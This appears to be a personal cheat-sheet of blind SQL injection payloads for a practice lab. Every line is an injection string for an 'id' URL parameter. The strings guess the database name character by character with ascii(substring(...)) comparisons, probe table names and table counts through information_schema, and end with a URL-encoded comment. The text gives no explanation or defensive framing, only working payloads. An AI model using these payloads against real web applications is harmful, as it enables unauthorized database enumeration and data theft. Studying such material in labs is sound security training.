# blind

id=1 and ascii(substring(database(),1,1))>100 --%20

?id=1' and (select table_name from information_schema.tables where table_schema='security' limit 0,1)='emails' --%20    
OR   
?id=1' and ascii(substring((select table_name from information_schema.tables where table_schema='security' limit 0,1)),1,1)>120 --%20

?id=1' and (select count(*) from information_schema.tables where table_schema='security')=3 --%20

